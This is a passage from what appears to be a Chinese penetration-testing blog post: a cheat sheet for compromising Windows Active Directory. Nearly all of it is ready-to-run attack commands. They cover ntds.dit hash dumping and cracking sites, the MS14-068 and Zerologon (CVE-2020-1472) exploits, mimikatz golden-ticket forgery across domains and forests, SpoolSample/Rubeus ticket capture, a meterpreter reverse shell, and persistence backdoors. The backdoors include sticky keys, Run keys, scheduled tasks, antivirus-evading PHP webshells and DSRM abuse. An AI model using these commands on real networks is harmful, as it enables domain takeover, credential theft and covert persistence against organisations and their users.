class="variable">%SHADOW_DEVICE_1%</span>\<span class="variable">%SOURCE_RELATIVE_PATH%</span>&quot; <span class="variable">%DESTINATION_PATH%</span></span><br><span class="line">reg save hklm\system system.hive</span><br></pre></td></tr></table></figure>

<p>导出后使用esentutl修复</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">esentutl /p /o ntds.dit</span><br></pre></td></tr></table></figure>

<p>再使用QuarksPwDump导出Hash</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt</span><br></pre></td></tr></table></figure>

<p>NTLM Hash破解网站：</p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://hashkiller.co.uk/ntlm-decrypter.aspx">https://hashkiller.co.uk/ntlm-decrypter.aspx</a></p>
<p><a target="_blank" rel="noopener" href="http://finder.insidepro.com/">http://finder.insidepro.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://crackstation.net/">https://crackstation.net/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
<p>LM Hash破解网站：</p>
<p><a target="_blank" rel="noopener" href="http://cracker.offensive-security.com/index.php">http://cracker.offensive-security.com/index.php</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mubix/pykek">https://github.com/mubix/pykek</a></p>
<h2 id="域内提权（MS14-048、CVE-2014-6324）"><a href="#域内提权（MS14-048、CVE-2014-6324）" class="headerlink" title="域内提权（MS14-048、CVE-2014-6324）"></a>域内提权（MS14-048、CVE-2014-6324）</h2><p>MS14-048漏洞影响所有windows服务器（除2016），只需要知道任意域用户用户名，SID和密码即可提权到域管理员权限。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">PyKEK是一个利用Kerberos协议进行渗透的工具包。python2.<span class="number">7</span>即可工作,linux下使用py脚本，windows下使用exe程序。</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">mubix</span>/<span class="title">pykek</span></span></span><br><span class="line"><span class="function"><span class="title">ms14</span>-068.<span class="title">exe</span> -<span class="title">u</span> 用户名@域名 -<span class="title">s</span> 域成员<span class="title">sid</span> -<span class="title">d</span> 域控<span class="title">ip</span>地址 -<span class="title">p</span> 密码</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">wmic</span> <span class="title">qfe</span> <span class="title">get</span> <span class="title">hotfixid</span>  查看是否安装了对应补丁</span></span><br><span class="line"><span class="function"><span class="title">whoami</span> /<span class="title">user</span> 查看用户<span class="title">SID</span></span></span><br><span class="line"><span class="function"><span class="title">ms14</span>-068.<span class="title">exe</span> -<span class="title">u</span> <span class="title">user</span>@<span class="title">test.com</span> -<span class="title">s</span> <span class="title">xxx</span>-<span class="title">xx</span>-<span class="title">x</span>-<span class="title">x</span>-<span class="title">xxxx</span>-<span class="title">xxxx</span> -<span class="title">d</span> 192.168.1.1 -<span class="title">p</span> <span class="title">password</span>  生成票据</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> &quot;<span class="title">kerberos</span>::<span class="title">purge</span>&quot; <span class="title">exit</span> 清除内存中的票据信息</span></span><br><span class="line"><span class="function"><span class="title">mimikatz.exe</span> &quot;<span class="title">kerberos</span>::<span class="title">ptc</span> <span class="title">TGT_user</span>@<span class="title">test.com.cache</span>&quot;  <span class="title">exit</span> 导入票据</span></span><br><span class="line"><span class="function">此时就具有了域管理员权限</span></span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">goldenPac.py是对kerberos进行测试的工具，其集成在impacket工具包中，在impacket-master/examples目录下</span><br><span class="line">goldenPac是使用PsExec获得shell的，会产生大量日志，而且PsExec已经被大部分杀软拉黑了，所以goldenPac实战效果并不好。</span><br><span class="line"></span><br><span class="line">kali中默认不包含kerberos客户端，需要安装。</span><br><span class="line">apt-get install krb5-user -y</span><br><span class="line"></span><br><span class="line">python goldenPac.py 域名/用户名：密码@域控地址（主机名）</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">msf</span><br><span class="line">use auxiliary/admin/kerberos/ms14_068_kerberos_checksum</span><br><span class="line">填入对应域名，密码，用户名，SID后exploit，会在/root/.msf4/loot下生成一个bin文件。</span><br><span class="line">msf不支持bin文件的导入，所以需要用mimikatz转换一下。</span><br><span class="line">在mimikatz中输入以下命令：</span><br><span class="line"><span class="function">kerberos::<span class="title">clist</span> &quot;<span class="title">xxxxx.bin</span>&quot; /<span class="title">export</span></span></span><br><span class="line"><span class="function">会生成<span class="title">kirbi</span>文件</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">在<span class="title">msf</span>的<span class="title">session</span>会话中执行：</span></span><br><span class="line"><span class="function"><span class="title">load</span> <span class="title">kiwi</span></span></span><br><span class="line"><span class="function">接着输入导出的<span class="title">kirbi</span>文件路径</span></span><br><span class="line"><span class="function">即可获得域管理员权限</span></span><br><span class="line"><span class="function">可以对权限进行测试</span></span><br><span class="line"><span class="function">使用<span class="title">backgroud</span>，切换到后台</span></span><br><span class="line"><span class="function">使用以下命令将内网其他机器反弹回一个<span class="title">system</span>权限会话</span></span><br><span class="line"><span class="function"><span class="title">use</span> <span class="title">exploit</span>/<span class="title">windows</span>/<span class="title">local</span>/<span class="title">current_user_psexec</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">TECHNIQUE</span> <span class="title">PSH</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">RHOSTS</span> <span class="title">test.test.com</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">payload</span> <span class="title">windows</span>/<span class="title">meterpreter</span>/<span class="title">reverse_tcp</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">lhost</span> <span class="title">kali</span>的<span class="title">ip</span></span></span><br><span class="line"><span class="function"><span class="title">set</span> <span class="title">session</span> 1</span></span><br><span class="line"><span class="function"><span class="title">exploit</span></span></span><br></pre></td></tr></table></figure>

<h1 id="域林"><a href="#域林" class="headerlink" title="域林"></a>域林</h1><h2 id="获取域信息"><a href="#获取域信息" class="headerlink" title="获取域信息"></a>获取域信息</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">查看信任域</span><br><span class="line">nltest /domain_trusts</span><br><span class="line">    <span class="number">0</span>: LIVE live.test.com (NT <span class="number">5</span>) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )</span><br><span class="line">    <span class="number">1</span>: MDU test.com (NT <span class="number">5</span>) (Forest <span class="built_in">Tree</span> Root) (Primary Domain) (Native)</span><br><span class="line">native 标签表示当前域，当有attr：<span class="number">0</span>x20标签，则表示在同一个域林，Direct Outbound表示信任传出，Direct Inbound表示信任传入。</span><br><span class="line">/primary 仅返回计算机账户属于的域</span><br><span class="line">/forest  仅返回主域同一森林下的域</span><br><span class="line">/direct_out返回被主域明确信任的域</span><br><span class="line">/direct_in 返回明确信任的域</span><br><span class="line">/all_trusts 返回所有已信任的域</span><br><span class="line">/v 详细输出，包括域的SIDs和GUIDs</span><br><span class="line">nltest /dclist:test.com  查询域控主机名</span><br><span class="line"></span><br><span class="line">powershell执行绕过讲解https://www.freebuf.com/articles/system/<span class="number">93829</span>.html</span><br><span class="line"></span><br><span class="line">powerview查看信任域</span><br><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">PowerShellMafia</span>/<span class="title">PowerSploit</span>/<span class="title">tree</span>/<span class="title">master</span>/<span class="title">Recon</span></span></span><br><span class="line"><span class="function">已经被杀软查杀，可使用<span class="title">ISESteroids</span>进行<span class="title">powershell</span>的混淆</span></span><br><span class="line"><span class="function">查询信任域：</span></span><br><span class="line"><span class="function"><span class="title">PowerShell.exe</span> -<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">command</span> &quot;. .\<span class="title">powerview.ps1</span>;<span class="title">Get</span>-<span class="title">NetDomainTrust</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">在域控上查询信任域</span></span><br><span class="line"><span class="function"><span class="title">netdom</span> <span class="title">query</span> <span class="title">trust</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">powerview</span>收集域内信息</span></span><br><span class="line"><span class="function">收集域用户的详细信息：</span></span><br><span class="line"><span class="function"><span class="title">PowerShell.exe</span> -<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">command</span> &quot;. .\<span class="title">powerview.ps1</span>;<span class="title">Get</span>-<span class="title">NetUser</span> -<span class="title">Domain</span> <span class="title">test.com</span>&quot;</span></span><br><span class="line"><span class="function">查询指定域用户的详细信息：</span></span><br><span class="line"><span class="function"><span class="title">PowerShell.exe</span> -<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">command</span> &quot;. .\<span class="title">powerview.ps1</span>;<span class="title">Get</span>-<span class="title">NetUser</span> -<span class="title">Domain</span> <span class="title">test.com</span> <span class="title">mduadmin</span>&quot;</span></span><br><span class="line"><span class="function">收集域内机器的详细信息：</span></span><br><span class="line"><span class="function"><span class="title">PowerShell.exe</span> -<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">command</span> &quot;. .\<span class="title">powerview.ps1</span>;<span class="title">Get</span>-<span class="title">NetComputer</span> -<span class="title">Domain</span> <span class="title">test.com</span>&quot;</span></span><br><span class="line"><span class="function">收集域内用户组的详细信息：</span></span><br><span class="line"><span class="function"><span class="title">PowerShell.exe</span> -<span class="title">ExecutionPolicy</span> <span class="title">Bypass</span> -<span class="title">command</span> &quot;. .\<span class="title">powerview.ps1</span>;<span class="title">Get</span>-<span class="title">NetGroup</span> -<span class="title">Domain</span> <span class="title">test.com</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">adfind</span>收集域内信息：<span class="title">adfind</span>基本不杀</span></span><br><span class="line"><span class="function"><span class="title">http</span>://<span class="title">www.joeware.net</span>/<span class="title">freetools</span>/<span class="title">tools</span>/<span class="title">adfind</span>/</span></span><br><span class="line"><span class="function">使用说明：<span class="title">http</span>://<span class="title">www.joeware.net</span>/<span class="title">freetools</span>/<span class="title">tools</span>/<span class="title">adfind</span>/<span class="title">usage.htm</span></span></span><br><span class="line"><span class="function">查询所有域用户信息：</span></span><br><span class="line"><span class="function"><span class="title">adfind.exe</span> -<span class="title">h</span> <span class="title">citad.test.com</span> -<span class="title">sc</span> <span class="title">u</span>:*</span></span><br><span class="line"><span class="function">查询指定域用户信息：</span></span><br><span class="line"><span class="function"><span class="title">adfind.exe</span> -<span class="title">h</span> <span class="title">dc.test.com</span> -<span class="title">sc</span> <span class="title">u:mduadmin</span></span></span><br><span class="line"><span class="function">查询所有域机器信息：</span></span><br><span class="line"><span class="function"><span class="title">adfind.exe</span> -<span class="title">h</span> <span class="title">dc.test.com</span> -<span class="title">sc</span> <span class="title">c</span>:*</span></span><br><span class="line"><span class="function">查询所有域用户组信息：</span></span><br><span class="line"><span class="function"><span class="title">adfind.exe</span> -<span class="title">h</span> <span class="title">dc.test.com</span> -<span class="title">sc</span> <span class="title">G</span>:*</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">adexplorer</span>查询域内信息</span></span><br><span class="line"><span class="function"><span class="title">adexplorer</span>是微软自己的域内管理工具</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">docs.microsoft.com</span>/<span class="title">en</span>-<span class="title">us</span>/<span class="title">sysinternals</span>/<span class="title">downloads</span>/<span class="title">adexplorer</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">在<span class="title">dns</span>服务器上使用<span class="title">dnscmd</span>查询域控主机</span></span><br><span class="line"><span class="function"><span class="title">dnscmd</span> /<span class="title">enumzones</span>  查询<span class="title">dns</span>区域</span></span><br><span class="line"><span class="function"><span class="title">dnscmd</span> /<span class="title">zoneprint</span> <span class="title">test.com</span>    查询域内主机的<span class="title">ip</span></span></span><br></pre></td></tr></table></figure>

<h2 id="利用域信任密钥获取目标域的权限"><a href="#利用域信任密钥获取目标域的权限" class="headerlink" title="利用域信任密钥获取目标域的权限"></a>利用域信任密钥获取目标域的权限</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">步骤：</span><br><span class="line"><span class="number">1</span>、获取当前域SID，目标域SID，信任密钥</span><br><span class="line"><span class="number">2</span>、利用mimikatz伪造票据</span><br><span class="line"><span class="number">3</span>、利用票据创建TGS</span><br><span class="line"><span class="number">4</span>、将TGS注入内存</span><br><span class="line"></span><br><span class="line">SIDHistory版黄金票据的基础是森林内信任关系，因为如果不是森林内信任关系，则SIDHistory会被微软的SID Filter规则过滤，从而失效，但是在森林内部是不会有SID Filter规则的。</span><br><span class="line">企业管理组EA（Enterprise Administrators）只存在于域林的根域中。子域中无EA组，但是根域的EA组会被域林的所有域加入到本域的域管理员组中。EA的SID固定为根域的SID加上固定的RID：<span class="number">519</span></span><br><span class="line">如果将使用EA的SID设置SIDHistory属性，并和黄金票据结合，则在只获取任意一个域的kerbtgt账号NTLM值的前提下，可实现森林内部所有域的跨域黄金票据。</span><br><span class="line"></span><br><span class="line">存在信任账户的情况下，获取信任账户的NTLM值</span><br><span class="line">查看域内所有账户：</span><br><span class="line">Get-ADUser -Filter &#123;samAccountName -like &quot;*&quot;&#125;</span><br><span class="line">查看域内信任账户：</span><br><span class="line">Get-ADUser -Filter &#123;samAccountName -like &quot;*$&quot;&#125;</span><br><span class="line">获取信任账号的NTLM值：（mdutest0$为查询的信任账号）</span><br><span class="line">mimikatz.exe &quot;lsadump::dcsync /user:mdutest0$@test.com&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">内部信任下，获取信任账号的NTLM值：（域控上执行）</span><br><span class="line">mimikatz.exe &quot;lsadump::trust /patch&quot; <span class="keyword">exit</span></span><br><span class="line">结果中的rc4_hmac_nt即为域信任密钥</span><br><span class="line"></span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:pentest0$&quot; &quot;lsadump::trust /patch&quot; <span class="keyword">exit</span></span><br><span class="line">current标签即为当前域的SID</span><br><span class="line">Domain各标签里面都是其对应的SID</span><br><span class="line">NTLM即为信任密钥</span><br></pre></td></tr></table></figure>

<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">使用mimikatz创建信任票据：</span><br><span class="line">mimikatz.exe &quot;Kerberos::golden /domain:当前域名 /sid:当前域SID /sids:目标SID-<span class="number">519</span> /rc4:信任密钥 /user:任意用户名 /service:krbtgt /target:目标域 /ticket:pentest.kribi&quot; <span class="keyword">exit</span></span><br><span class="line">例：</span><br><span class="line">mimikatz.exe &quot;Kerberos::golden /domain:cn.pentest.lab /sid:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">2351813591</span>-<span class="number">1032915613</span>-<span class="number">2193107741</span> /sids:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">3341000548</span>-<span class="number">1901343826</span>-<span class="number">162851782</span>-<span class="number">519</span> /rc4:<span class="number">50</span>d5d07297f48791c8b821a52346bdb0 /user:ms08067 /service:krbtgt /target:目标域 /ticket:pentest.kribi&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">利用信任票据创建TGS：</span><br><span class="line">asktgs.exe test.kirbi c:\pentest.kribi CIFS/目标主机名</span><br><span class="line">将TGS注入内存：</span><br><span class="line">kirbikator.exe lsa .\TGS文件名 </span><br></pre></td></tr></table></figure>

<h2 id="利用krbtgt散列值获取目标域的权限"><a href="#利用krbtgt散列值获取目标域的权限" class="headerlink" title="利用krbtgt散列值获取目标域的权限"></a>利用krbtgt散列值获取目标域的权限</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">在域控上获取krbtgt散列值：</span><br><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::lsa /patch /user:krbtgt&quot; <span class="keyword">exit</span></span><br><span class="line">在域内任意主机使用普通用户完成黄金票据的构造和注入</span><br><span class="line">mimikatz.exe &quot;Kerberos::golden /user:Administrator /domain:当前域名 /sid:当前域sid /sids:目标域SID-<span class="number">519</span> /kebtgt:kebtgt散列值 /ptt&quot; <span class="keyword">exit</span></span><br><span class="line">ptt表示将票据注入内存</span><br></pre></td></tr></table></figure>

<h2 id="跨林攻击"><a href="#跨林攻击" class="headerlink" title="跨林攻击"></a>跨林攻击</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">利用林信任关系实现跨林攻击</span><br><span class="line">因为外部信任和林信任中存在SID过滤机制，所以无法利用SID History获取权限。</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、利用信任关系获取信任域的信息</span><br><span class="line">nltest /domain_trusts  获取信任域</span><br><span class="line">adfind -h 目标域的域控主机名 -sc u:administrator     导出所有用户的信息</span><br><span class="line">对比用户信息，找出当前域和目标域的共同用户</span><br><span class="line"><span class="number">2</span>、使用powerview来定位敏感用户</span><br><span class="line">Get-DomainForeignGroupMember -Domain 目标域</span><br><span class="line"></span><br><span class="line">利用无约束委派和MS-RPRN获取信任林权限</span><br><span class="line">MS-RPRN是打印机的一种协议，可以通过调用RpcRemoteFindFirstPrinterChangeNotification(Ex)方法，使信任林的域控制器向已被控制的服务器发送身份认证请求，再利用捕获的认证请求中的票据获取信任林内任意用户的NTLM值，从而获取权限。</span><br><span class="line"><span class="number">1</span>、在当前林的域控中使用rubeus监听身份认证请求。  https://github.com/GhostPack/Rubeus</span><br><span class="line">	rubeus.exe monitor /interval:<span class="number">5</span> /filteruser:bdc$   </span><br><span class="line">	interval参数指定监控的时间间隔</span><br><span class="line">	filteruser参数指定目标林的域控主机名</span><br><span class="line"><span class="number">2</span>、在当前林的域控中使用SpoolSample工具让目标林的域控向本机发送身份认证请求</span><br><span class="line">下载地址：https://github.com/leechristensen/SpoolSample</span><br><span class="line">	spoolsample bdc.b.com adc.a.com</span><br><span class="line"><span class="number">3</span>、此时已经获取到tgt数据，再使用rubeus工具将票据注入内存</span><br><span class="line">	rubeus ptt /ticket:TGT数据</span><br><span class="line"><span class="number">4</span>、使用mimikatz获取目标域的kebtgt的NTLM</span><br><span class="line">	mimikatz &quot;lsadump::dcsync /domain:b.com /user:b\krbtgt&quot; <span class="keyword">exit</span></span><br><span class="line"><span class="number">5</span>、将获取的sid，NTLM注入内存即可获取权限</span><br><span class="line">	mimikatz &quot;Kerberos::golden /user:administartor /domain:b.com /sid:sid值(要去除最后的RID) /rc4:NTLM值 /ptt&quot; <span class="keyword">exit</span></span><br><span class="line"></span><br><span class="line">在获取到NTLM后，可以使用wmiexec来连接目标主机的<span class="number">445</span>端口，获取对应权限：</span><br><span class="line">python wmiexec.py -hashes LM值:NTLM值 目标主机名/administrator@<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="CVE-2020-1472-windows域控提权"><a href="#CVE-2020-1472-windows域控提权" class="headerlink" title="CVE-2020-1472 windows域控提权"></a>CVE-2020-1472 windows域控提权</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="function">https://<span class="title">github.com</span>/<span class="title">VoidSec</span>/<span class="title">CVE</span>-2020-1472</span></span><br><span class="line"><span class="function"><span class="title">https</span>://<span class="title">github.com</span>/<span class="title">risksense</span>/<span class="title">zerologon</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">攻击过程：</span></span><br><span class="line"><span class="function">将机器账号密码设置为空-&gt; 导出<span class="title">hash</span> -&gt; <span class="title">hash</span>传递攻击</span></span><br><span class="line"><span class="function">将机器账户密码置空后会使得<span class="title">dc</span>功能异常，例如<span class="title">dns</span>管理异常等等问题，在实际环境中不要轻易使用，使用的情况下务必导出<span class="title">sam</span>文件，方便后期还原。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">安装 <span class="title">impacket</span></span></span><br><span class="line"><span class="function"><span class="title">git</span> <span class="title">clone</span> <span class="title">https</span>://<span class="title">github</span>,<span class="title">com</span>/<span class="title">SecureAuthCorp</span>/<span class="title">impacket</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">impacket</span></span></span><br><span class="line"><span class="function"><span class="title">pwd</span></span></span><br><span class="line"><span class="function">~/<span class="title">impacket</span>/</span></span><br><span class="line"><span class="function"><span class="title">virtualenv</span> --<span class="title">python</span>=<span class="title">python3</span> <span class="title">impacket</span></span></span><br><span class="line"><span class="function"><span class="title">source</span> <span class="title">impacket</span>/<span class="title">bin</span>/<span class="title">activate</span></span></span><br><span class="line"><span class="function"><span class="title">pip</span> <span class="title">install</span> .</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">git</span> <span class="title">clone</span> <span class="title">https</span>://<span class="title">github.com</span>/<span class="title">risksense</span>/<span class="title">zerologon.git</span></span></span><br><span class="line"><span class="function"><span class="title">cd</span> <span class="title">zerologon</span></span></span><br><span class="line"><span class="function"><span class="title">pip3</span> <span class="title">install</span> -<span class="title">r</span> <span class="title">requirements.txt</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">使用：</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">set_empty_pw.py</span> 目标域控主机名 目标<span class="title">ip</span>             将目标主机密码置空</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">secretsdump.py</span> -<span class="title">hashes</span> :<span class="title">NTLM</span>值 &#x27;目标域名/机器账户名@目标<span class="title">ip</span>&#x27;   获取目标主机所有用户的<span class="title">NTLM</span>值</span></span><br><span class="line"><span class="function">例：</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">set_empty_pw.py</span> <span class="title">adc</span> 192.168.1.1</span></span><br><span class="line"><span class="function"><span class="title">python3</span> <span class="title">secretsdump.py</span> -<span class="title">hashes</span> :31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span> &#x27;<span class="title">a.com</span>/<span class="title">adc</span>$@192.168.1.1&#x27;</span></span><br><span class="line"><span class="function">31<span class="title">d6cfe0d16ae931b73c59d7e0c089c0</span>就是空密码</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">adc.a.com</span></span></span><br><span class="line"><span class="function"><span class="title">adc</span>为主机名</span></span><br><span class="line"><span class="function"><span class="title">adc</span>$为机器账户名</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">机器账户还原：<span class="title">Reset</span>-<span class="title">ComputerMechinePassword</span></span></span><br></pre></td></tr></table></figure>

<h1 id="后门-3"><a href="#后门-3" class="headerlink" title="后门"></a>后门</h1><h2 id="粘滞键后门"><a href="#粘滞键后门" class="headerlink" title="粘滞键后门"></a>粘滞键后门</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">将sethc程序替换成<span class="built_in">cmd</span>程序。打开粘滞键功能即可。</span><br><span class="line">sethc.exe位于c:/windows/system32/下</span><br><span class="line">连续按五次<span class="built_in">shift</span>键就会启动<span class="built_in">cmd</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="注册表后门"><a href="#注册表后门" class="headerlink" title="注册表后门"></a>注册表后门</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">计算机\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">在注册表该位置添加任意键值对，（键名可以任意设置，键值设置为后门程序路径即可）当系统重启后，就会执行该后门程序</span><br><span class="line">该后门大概率会被杀，不推荐</span><br></pre></td></tr></table></figure>

<h2 id="计划任务后门"><a href="#计划任务后门" class="headerlink" title="计划任务后门"></a>计划任务后门</h2><p>在win7之前使用at命令调用计划任务，win8版本后使用schtasks命令调用。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">schtasks /Create /tn Updater /tr calc.exe /sc hourly /mo <span class="number">1</span></span><br><span class="line"></span><br><span class="line">/sc onlogon 用户登陆时执行</span><br><span class="line">/sc onstart 用户启动时执行</span><br><span class="line">/sc onidle 系统空闲时执行</span><br><span class="line">/ru System 以系统管理员权限运行</span><br></pre></td></tr></table></figure>

<h2 id="weevely的webshell后门-php"><a href="#weevely的webshell后门-php" class="headerlink" title="weevely的webshell后门 php"></a>weevely的webshell后门 php</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">weevely是kali自带的工具,生成的php文件，免杀效果还可以，大部分都可直接过，但是未测试流量是否异常</span><br><span class="line">生成webshell： weevely generate password about.php</span><br><span class="line">连接webshell： weevely url password 连接后输入<span class="built_in">help</span>查看可使用命令</span><br><span class="line">加载会话文件：  weevely webshell.txt </span><br><span class="line">net_scan <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> <span class="number">1</span>-<span class="number">100</span>  扫描<span class="number">1</span>-<span class="number">100</span>端口</span><br></pre></td></tr></table></figure>

<p>5、webacoo的webshell后门 php</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">webacoo生成的webshell，可以绕过大部分杀软，但是未测试流量是否异常</span><br><span class="line">webacoo -g -o about.php 生成php后门</span><br><span class="line">webacoo -t -u http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>/about.php  连接后门，连接成功后使用load查看其模块，<span class="keyword">exit</span>退出</span><br><span class="line">-f 指定命令执行函数，默认为system，执行函数有：system,shell_exec,exec,passthru,popen</span><br><span class="line">-r  生成不需要编码的webshell</span><br><span class="line">-t 远程使用Terminal连接，必须结合-u使用</span><br><span class="line">-u 指定后门url</span><br><span class="line">-e 单独的命令执行模式，必须结合-t，-u使用</span><br><span class="line">-m http请求方式，默认为GET</span><br><span class="line">-c cookie的名称</span><br><span class="line">-d 界定符</span><br><span class="line">-a http标头用户代理</span><br><span class="line">-p 使用代理（&quot;tor,ip:port&quot;或&quot;user:password:ip:port&quot;）</span><br><span class="line">-v 显示详细信息</span><br><span class="line">-l 显示日志</span><br><span class="line">-h 查看帮助</span><br></pre></td></tr></table></figure>

<h2 id="利用DSRM持久化控制域控"><a href="#利用DSRM持久化控制域控" class="headerlink" title="利用DSRM持久化控制域控"></a>利用DSRM持久化控制域控</h2><p>DSRM（Directory Service Restore Mode，目录服务恢复模式）是域环境中域控的安全模式启动选项。每个域控都有一个本地管理员账户，也就是DSRM账户。</p>
<p>DSRM的用途是：允许管理员在域环境中出现崩溃或者故障时还原、修复活动目录数据库的。</p>
<p>DSRM的密码需要在安装DC时设置，且很少被重置。</p>
<p>如果域控为Server2008，需要安装KB961320才可以使用指定域账号的密码对DSRM的密码进行同步，在2008之后不需要安装该补丁，2003则无法使用该方法进行持久化。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">修改DSRM账户密码：</span><br><span class="line"><span class="built_in">cmd</span>中打开ntdsutil</span><br><span class="line"><span class="built_in">set</span> dsrm password   设置DSRM密码</span><br><span class="line">reset password on server null  在当前域控上恢复DSRM密码</span><br><span class="line">输入要设置的密码</span><br><span class="line">q    退出DSRM密码设置模式</span><br><span class="line">q    退出ntdsutil</span><br><span class="line"></span><br><span class="line">同步本地DSRM和域账户的密码</span><br><span class="line"><span class="built_in">cmd</span>中打开ntdsutil</span><br><span class="line"><span class="built_in">set</span> dsrm password</span><br><span class="line">sync from domain account krbtgt</span><br><span class="line">q</span><br><span class="line">q</span><br><span class="line"></span><br><span class="line">修改DSRM的登陆方式</span><br><span class="line">在注册表中存在一个值保存着DSRM的登陆方式</span><br><span class="line"><span class="number">0</span>为默认值，只有域控制器重启进入DSRM模式，才可以使用DSRM账户</span><br><span class="line"><span class="number">1</span>为只有本地AD，DS服务停止时，才可以使用DSRM账户</span><br><span class="line"><span class="number">2</span>为在任何情况下，都可以使用DSRM账户登陆域控</span><br><span class="line">利用powershell修改此处值</span><br><span class="line">New-ItemProperty &quot;hklm:\system\currentcontrolset\control\lsa&quot; -name &quot;dsrmadminlogonbehavior&quot; -value <span class="number">2</span> -propertyType DWORD</span><br><span class="line"></span><br><span class="line">修改该密码会产生ID为<span class="number">4794</span>日志</span><br></pre></td></tr></table></figure>

<h2 id="利用SSP持久化控制域控"><a href="#利用SSP持久化控制域控" class="headerlink" title="利用SSP持久化控制域控"></a>利用SSP持久化控制域控</h2><p>SSP（Security Support Provider）是Windows操作系统安全机制的提供者。简单点说，SSP是一个DLL文件，用来实现Windows的身份认证功能，比如：NTLM，Kerberos，Negotiate，等等。</p>
<p>SSPI（Security Support Provider Interface）是SSP的API接口。</p>
<p>LSA（Local Security Authority）用于身份验证，lsass.exe用于本地安全和登陆策略。使用SSP进行持久化的原理就是，在系统启动时，SSP将被加载到lsass.exe进程中，但是，假如攻击者对LSA进行了扩展，自定义了恶意的DLL文件，就可以获取到lsass中的明文密码，这样即使修改了密码，依然可以获取到新密码。</p>
